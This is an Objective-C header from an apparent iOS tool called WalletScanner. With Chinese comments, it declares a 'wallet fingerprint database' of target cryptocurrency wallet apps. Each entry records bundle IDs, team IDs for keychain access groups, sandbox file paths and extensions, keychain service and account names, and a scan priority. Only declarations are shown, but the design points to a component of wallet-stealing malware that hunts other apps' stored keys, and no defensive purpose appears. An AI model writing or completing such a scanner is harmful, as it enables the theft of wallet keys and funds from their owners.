//
//  RDWalletTarget.h
//  WalletScanner
//
//  钱包指纹数据库 - 定义所有目标钱包的 BundleID / 关键文件 / Keychain 信息
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface RDWalletTarget : NSObject

@property (nonatomic, copy)   NSString *bundleID;            // App Bundle ID
@property (nonatomic, copy)   NSString *displayName;         // 钱包名称
@property (nonatomic, copy)   NSString *teamID;              // Team ID (用于Keychain AccessGroup)
@property (nonatomic, copy)   NSArray<NSString *> *filePatterns;     // 沙盒内关键文件/目录 (相对路径)
@property (nonatomic, copy)   NSArray<NSString *> *fileExtensions;   // 关键文件扩展名
@property (nonatomic, copy)   NSArray<NSString *> *keychainServices; // Keychain service 名
@property (nonatomic, copy)   NSArray<NSString *> *keychainAccounts; // Keychain account 关键字
@property (nonatomic, assign) NSInteger priority;            // 优先级 (越小越先扫)

@end

// ============================================================
//  钱包指纹库 - 开箱即用
// ============================================================
@interface RDWalletFingerprintDB : NSObject

+ (NSArray<RDWalletTarget *> *)allTargets;

// 根据 BundleID 查找
+ (nullable RDWalletTarget *)targetForBundleID:(NSString *)bundleID;

// 所有已知的钱包 BundleID 列表
+ (NSArray<NSString *> *)allBundleIDs;

@end

NS_ASSUME_NONNULL_END
